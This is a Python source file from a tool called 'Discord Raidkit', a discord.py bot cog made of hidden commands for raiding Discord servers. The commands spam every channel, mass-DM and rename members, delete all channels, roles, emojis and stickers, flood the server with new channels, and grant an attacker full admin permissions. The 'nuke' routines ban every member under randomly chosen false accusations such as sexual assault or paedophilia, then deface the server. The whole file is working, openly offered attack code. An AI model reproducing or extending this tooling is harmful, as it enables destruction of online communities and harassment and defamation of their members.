"""
Discord Raidkit v2.4.5
the-cult-of-integral

Last modified: 2023-11-04 20:58
"""

import asyncio
import os
import typing
import random
import discord
import discord.ext.commands as commands

import tools.raider as rd
import ui.drui as drui
import utils.log_utils as lu

T = typing.TypeVar('T')


class Cmds(commands.Cog):
    
    def __init__(self, bot: rd.Raider):
        self.bot: rd.Raider = bot
    
    @commands.command(hidden=True)
    async def close(self, ctx: commands.Context):
        """Closes the bot.

        Args:
            ctx (commands.Context): the command context
        """
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        await self.bot.close()
    
    @commands.command(hidden=True, aliases=['nick', 'nickall'])
    async def nick_all(self, ctx: commands.Context, *, nickname: str):
        """Nicknames all members in the server.

        Args:
            ctx (commands.Context): the command context
            nickname (str): the nickname to set
        """
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        if not nickname.strip():
            self.__do_missing_arg_msg(ctx, 'nickname')
            return
        
        self.__do_start_cmd_msg('nick_all')
        
        results = await asyncio.gather(
            *[member.edit(nick=nickname) for member in ctx.guild.members], 
            return_exceptions=True)

        for result, member in zip(results, ctx.guild.members):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to change nickname for {member.name}#{member.discriminator}: {result}')
            else:
                lu.sinfo(f'Changed nickname for {member.name}#{member.discriminator} to {member.nick}')
        
        self.__do_finish_cmd_msg('nick_all')
    
    @commands.command(hidden=True, aliases=['msg', 'msgall'])
    async def msg_all(self, ctx: commands.Context, *, message: str):
        """Messages all members in the server.

        Args:
            ctx (commands.Context): the command context
            message (str): the message to send
        """
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        if not message.strip():
            self.__do_missing_arg_msg(ctx, 'message')
            return
        
        self.__do_start_cmd_msg('msg_all')
        
        results = await asyncio.gather(
            *[member.send(message) for member in ctx.guild.members], 
            return_exceptions=True)

        for result, member in zip(results, ctx.guild.members):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to send message to {member.name}#{member.discriminator}: {result}')
            else:
                lu.sinfo(f'Sent message to {member.name}#{member.discriminator} to {member.nick}')
        
        self.__do_finish_cmd_msg('msg_all')
    
    @commands.command(hidden=True)
    async def spam(self, ctx: commands.Context, *, message: str = '@everyone'):
        """Spams a message in all text channels.

        Args:
            ctx (commands.Context): the command context
            message (str, optional): the message to send. Defaults to @everyone.
        """
        
        def check_reply(reply) -> bool:
            return reply.content.lower() == 'stop' and reply.author == ctx.author
        
        async def spam_text() -> None:
            while True:
                tasks = [c.send(message) for c in ctx.guild.text_channels]
                await asyncio.gather(*tasks, return_exceptions=True)
        
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        if not message.strip():
            self.__do_missing_arg_msg(ctx, 'message')
            return
        
        self.__do_start_cmd_msg('spam', True)
        
        spam_task = self.bot.loop.create_task(spam_text())
        await self.bot.wait_for('message', check=check_reply)
        spam_task.cancel()
        
        self.__do_finish_cmd_msg('spam')
    
    @commands.command(hidden=True)
    async def cpurge(self, ctx: commands.Context):
        """Deletes all channels in the server.

        Args:
            ctx (commands.Context): the command context
        """
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        self.__do_start_cmd_msg('cpurge')
        
        old_channels = ctx.guild.channels
        results = await asyncio.gather(
            *[c.delete() for c in ctx.guild.channels], 
            return_exceptions=True)

        for result, channel in zip(results, old_channels):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to delete channel {channel.name}: {result}')
            else:
                lu.sinfo(f'Deleted channel {channel.name}')
        
        self.__do_finish_cmd_msg('cpurge')
    
    @commands.command(hidden=True)
    async def cflood(self, ctx: commands.Context, amount: str, *, name: str):
        if not await self.bot.is_owner(ctx.author):
            return
        
        if not amount.strip():
            self.__do_missing_arg_msg(ctx, 'amount')
            return
        
        if not name.strip():
            self.__do_missing_arg_msg(ctx, 'name')
            return
        
        await ctx.message.delete()
        
        try:
            iamount = int(amount)
        except ValueError:
            self.__do_convert_arg_msg(ctx, 'amount', int)
            return
        
        self.__do_start_cmd_msg('cflood')
        
        old_channels = ctx.guild.channels
        results = await asyncio.gather(
            *[ctx.guild.create_text_channel(name) for _ in range(iamount)], 
            return_exceptions=True)
        
        new_channels = [c for c in ctx.guild.channels if c not in old_channels]
        for result, channel in zip(results, new_channels):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to create channel {channel.name}: {result}')
            else:
                lu.sinfo(f'Created channel {channel.name}')
                
        self.__do_finish_cmd_msg('cflood')
    
    @commands.command(hidden=True)
    async def admin(self, ctx: commands.Context, member: discord.Member, *, role_name: str):
        """Gives a member a new admin role.

        Args:
            ctx (commands.Context): the command context
            member (discord.Member): the member to give the role to
            role_name (str): the name of the new admin role
        """
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        if not member:
            self.__do_missing_arg_msg(ctx, 'member')
            return
        
        if not role_name.strip():
            self.__do_missing_arg_msg(ctx, 'role_name')
            return
        
        self.__do_start_cmd_msg('admin')
        
        try:
            await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.all())
            role = discord.utils.get(ctx.guild.roles, name=role_name)
            await member.add_roles(role)
        except discord.errors.HTTPException as e:
            if self.bot.clear_screen:
                os.system('cls' if os.name == 'nt' else 'clear')
            print(drui.raider_cmds(self.bot.prefix, self.bot.bot_type) + 
                  f'Failed to grant admin role: HTTPException: {e}')
            lu.swarning(f'Failed to grant admin role: HTTPException: {e}')
            return
        except Exception as e:
            if self.bot.clear_screen:
                os.system('cls' if os.name == 'nt' else 'clear')
            print(drui.raider_cmds(self.bot.prefix, self.bot.bot_type) + 
                  f'Failed to grant admin role: Exception: {e}')
            lu.swarning(f'Failed to grant admin role: Exception: {e}')
            return
        
        self.__do_finish_cmd_msg('admin')
    
    @commands.command(hidden=True)
    async def raid(self, ctx: commands.Context, role_name: str, nickname: str,
                   amount: str, name: str, *, message: str = ''):
        
        def check_reply(reply) -> bool:
            return reply.content.lower() == 'stop' and reply.author == ctx.author
        
        async def spam_text():
            while True:
                await asyncio.gather(
                    *[c.send(message) for c in ctx.guild.text_channels], 
                    return_exceptions=True)
        
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        if not role_name.strip():
            self.__do_missing_arg_msg(ctx, 'role_name')
            return
        
        if not nickname.strip():
            self.__do_missing_arg_msg(ctx, 'nickname')
            return
        
        if not amount.strip():
            self.__do_missing_arg_msg(ctx, 'amount')
            return
        
        if not name.strip():
            self.__do_missing_arg_msg(ctx, 'name')
            return
        
        try:
            iamount = int(amount)
        except ValueError:
            self.__do_convert_arg_msg(ctx, 'amount', int)
            return
        
        self.__do_start_cmd_msg('raid', bool(message.strip()))
        
        # Give everyone a role
        
        try:
            await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.none(), color=0xff0000)
            role = discord.utils.get(ctx.guild.roles, name=role_name)
            
            results = await asyncio.gather(
                *[member.add_roles(role) for member in ctx.guild.members], 
                return_exceptions=True)
            
            for result, member in zip(results, ctx.guild.members):
                if isinstance(result, Exception):
                    lu.swarning(f'Failed to give role to {member.name}: {result}')
                else:
                    lu.sinfo(f'Gave role to {member.name}')
        except discord.errors.HTTPException as e:
            if self.bot.clear_screen:
                os.system('cls' if os.name == 'nt' else 'clear')
            output = 'Running the raid command...'
            if message.strip():
                output += '\nType "stop" in a text channel to stop the spamming!'
            output += f'\n\nFailed to grant admin role: HTTPException: {e}'
            print(drui.raider_cmds(self.bot.prefix, self.bot.bot_type) + 
                  f'\n{output}')
            lu.swarning(f'Failed to grant admin role: HTTPException: {e}')
        except Exception as e:
            if self.bot.clear_screen:
                os.system('cls' if os.name == 'nt' else 'clear')
            output = 'Running the raid command...'
            if message.strip():
                output += '\nType "stop" in a text channel to stop the spamming!'
            output += f'\n\nFailed to grant admin role: Exception: {e}'
            print(drui.raider_cmds(self.bot.prefix, self.bot.bot_type) + 
                  f'\n{output}')
            lu.swarning(f'Failed to grant admin role: Exception: {e}')
        
        # Nickname everyone
        
        results = await asyncio.gather(
            *[member.edit(nick=nickname) for member in ctx.guild.members], 
            return_exceptions=True)

        for result, member in zip(results, ctx.guild.members):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to change nickname for {member.name}#{member.discriminator}: {result}')
            else:
                lu.sinfo(f'Changed nickname for {member.name}#{member.discriminator} to {member.nick}')
        
        # Delete all channels
        
        old_channels = ctx.guild.channels
        results = await asyncio.gather(
            *[c.delete() for c in ctx.guild.channels], 
            return_exceptions=True)

        for result, channel in zip(results, old_channels):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to delete channel {channel.name}: {result}')
            else:
                lu.sinfo(f'Deleted channel {channel.name}')
        
        # Create iamount new channels
        
        old_channels = ctx.guild.channels
        results = await asyncio.gather(
            *[ctx.guild.create_text_channel(name) for _ in range(iamount)], 
            return_exceptions=True)
        
        new_channels = [c for c in ctx.guild.channels if c not in old_channels]
        for result, channel in zip(results, new_channels):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to create channel {channel.name}: {result}')
            else:
                lu.sinfo(f'Created channel {channel.name}')
        
        # Spam the sever until 'stop' is replied with by command author
        
        spam_task = self.bot.loop.create_task(spam_text())
        await self.bot.wait_for('message', check=check_reply)
        spam_task.cancel()
        
        self.__do_finish_cmd_msg('raid')
        
    @commands.command(hidden=True)
    async def nuke(self, ctx: commands.Context):
        """Nuke the server.

        Args:
            ctx (commands.Context): the command context
        """
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        self.__do_start_cmd_msg('nuke')
        
        await self.__nuke(ctx.guild, ctx.author)
        
        self.__do_finish_cmd_msg('nuke')
    
    @commands.command(hidden=True, aliases=['massnuke', 'nuke_all', 'nukeall'])
    async def mass_nuke(self, ctx: commands.Context):
        """Nuke all servers the bot is in.

        Args:
            ctx (commands.Context): the command context
        """
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        self.__do_start_cmd_msg('mass_nuke')
        
        old_guilds = self.bot.guilds
        results = await asyncio.gather(
            *[self.__nuke(guild, ctx.author) for guild in self.bot.guilds], 
            return_exceptions=True)
        
        for result, guild in zip(results, old_guilds):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to nuke guild {guild.name}: {result}')
            else:
                lu.sinfo(f'Nuked guild {guild.name}')
        
        self.__do_finish_cmd_msg('mass_nuke')
    
    @commands.command(hidden=True)
    async def leave(self, ctx: commands.Context):
        """Get the bot to leave the server.

        Args:
            ctx (commands.Context): _description_
        """
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        self.__do_start_cmd_msg('leave')
        
        try:
            await ctx.guild.leave()
        except Exception as e:
            if self.bot.clear_screen:
                os.system('cls' if os.name == 'nt' else 'clear')
            print(drui.raider_cmds(self.bot.prefix, self.bot.bot_type) + 
                  f'\nBot failed to leave the guild {ctx.guild.name}: {e}')
            lu.swarning(f'Bot failed to leave the guild {ctx.guild.name}: {e}')
            return
        
        self.__do_finish_cmd_msg('leave')
    
    @commands.command(hidden=True, aliases=['massleave', 'leave_all', 'leaveall'])
    async def mass_leave(self, ctx: commands.Context):
        """Get the bot to leave all servers it is in.

        Args:
            ctx (commands.Context): the command context
        """
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        self.__do_start_cmd_msg('mass_leave')
        
        old_guilds = self.bot.guilds
        results = await asyncio.gather(
            *[guild.leave() for guild in self.bot.guilds], 
            return_exceptions=True)
        
        for result, guild in zip(results, old_guilds):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to leave guild {guild.name}: {result}')
            else:
                lu.sinfo(f'Left guild {guild.name}')
        
        self.__do_finish_cmd_msg('mass_leave')
    
    async def __nuke(self, guild: discord.Guild, author: discord.Member):
        old_members = guild.members
        results = await asyncio.gather(
            *[member.ban(reason=random.choice([
                'Racism', 'Homophobia', 'Transphobia', 'Sexism', 
                'Ableism', 'Ageism', 'Sexual Harassment', 
                'Sexual Assault', 'Harassment', 'Stalking', 
                'Threats', 'Trolling', 'Cyberbullying', 'Bullying', 
                'Hacking', 'Doxing', 'Paedophillia'])
            ) for member in guild.members if not (member == author or member == self.bot.user)], 
            return_exceptions=True)
        for result, member in zip(results, old_members):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to ban member {member.name} from guild {guild.name}: {result}')
            else:
                lu.sinfo(f'Banned member {member.name} from guild {guild.name}')

        old_channels = guild.channels
        results = await asyncio.gather(
            *[c.delete() for c in guild.channels], 
            return_exceptions=True)
        for result, channel in zip(results, old_channels):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to delete channel {channel.name} from guild {guild.name}: {result}')
            else:
                lu.sinfo(f'Deleted channel {channel.name} from guild {guild.name}')
        
        old_roles = guild.roles
        results = await asyncio.gather(
            *[r.delete() for r in guild.roles], 
            return_exceptions=True)
        for result, role in zip(results, old_roles):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to delete role {role.name} from guild {guild.name}: {result}')
            else:
                lu.sinfo(f'Deleted role {role.name} from guild {guild.name}')
        
        old_emojis = guild.emojis
        results = await asyncio.gather(
            *[e.delete() for e in guild.emojis], 
            return_exceptions=True)
        for result, emoji in zip(results, old_emojis):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to delete emoji {emoji.name} from guild {guild.name}: {result}')
            else:
                lu.sinfo(f'Deleted emoji {emoji.name} from guild {guild.name}')
        
        old_stickers = guild.stickers
        results = await asyncio.gather(
            *[s.delete() for s in guild.stickers], 
            return_exceptions=True)
        for result, sticker in zip(results, old_stickers):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to delete sticker {sticker.name} from guild {guild.name}: {result}')
            else:
                lu.sinfo(f'Deleted sticker {sticker.name} from guild {guild.name}')
        
        with open(os.path.join('shared', 'nuked.jpg'), 'rb') as nuke_icon:
            icon = nuke_icon.read()
        
        try:
            flags = discord.SystemChannelFlags()
            flags.guild_reminder_notifications = True
            flags.join_notification_replies = False
            flags.join_notifications = False
            flags.premium_subscriptions = False
            flags.role_subscription_purchase_notification_replies = False
            flags.role_subscription_purchase_notifications = False
            await guild.edit(
                name='Nuked by the-cult-of-integral',
                description='Nuked by the-cult-of-integral',
                icon=icon,
                banner=icon,
                splash=icon,
                discovery_splash=icon,
                discoverable=False,
                community=False,
                default_notifications=discord.NotificationLevel.all_messages,
                verification_level=discord.VerificationLevel.highest,
                explicit_content_filter=discord.ContentFilter.disabled,
                premium_progress_bar_enabled=False,
                preferred_locale=discord.Locale.japanese,
                afk_channel=None,
                afk_timeout=None,
                system_channel=None,
                system_channel_flags=flags,
                rules_channel=None,
                public_updates_channel=None
            )
        except discord.HTTPException as e:
            lu.swarning(f'Failed to edit guild {guild.name}: HTTPException: {e}')
        except Exception as e:
            lu.swarning(f'Failed to edit guild {guild.name}: Exception: {e}')
        
    def __do_missing_arg_msg(self, ctx: commands.Context, arg: str):
        """Print a message to the console when a command is missing an argument.

        Args:
            ctx (commands.Context): the command context
            arg (str): the missing argument
        """
        if self.bot.clear_screen:
            os.system('cls' if os.name == 'nt' else 'clear')
        print(drui.raider_cmds(self.bot.prefix, self.bot.bot_type) + 
              f'\nFailed to run command: {ctx.message.content}\n\
The {arg} argument was missing.')
    
    def __do_convert_arg_msg(self, ctx: commands.Context, arg: str, convert_type: T):
        """Print a message to the console when a command argument cannot be converted.

        Args:
            ctx (commands.Context): the command context
            arg (str): the argument
            convert_type (Type[T]): the type to convert to
        """
        if self.bot.clear_screen:
            os.system('cls' if os.name == 'nt' else 'clear')
        print(drui.raider_cmds(self.bot.prefix, self.bot.bot_type) + 
              f'\nFailed to run command: {ctx.message.content}\n\
The {arg} argument could not be converted to {type(convert_type).__name__}.')
    
    def __do_start_cmd_msg(self, cmd: str, has_spamming: bool = False) -> None:
        """Print a message to the console when a command is started.
        
        Args:
            cmd (str): the command name
            has_spamming (bool, optional): whether the command has spamming. Defaults to False.
        """
        if self.bot.clear_screen:
            os.system('cls' if os.name == 'nt' else 'clear')
        output = f'\nRunning the {cmd} command...'
        if has_spamming:
            output += '\nType "stop" in a text channel to stop the spamming!'
        print(drui.raider_cmds(self.bot.prefix, self.bot.bot_type) + output)
        lu.sinfo(f'Running the {cmd} command...')
    
    def __do_finish_cmd_msg(self, cmd: str) -> None:
        """Print a message to the console when a command is finished
        
        Args:
            cmd (str): the command name
        """
        if self.bot.clear_screen:
            os.system('cls' if os.name == 'nt' else 'clear')
        print(drui.raider_cmds(self.bot.prefix, self.bot.bot_type) + f'\n\
Finished running the {cmd} command.')
        lu.sinfo(f'Finished running the {cmd} command.')
    
        
async def setup(bot: rd.Raider):
    await bot.add_cog(Cmds(bot))
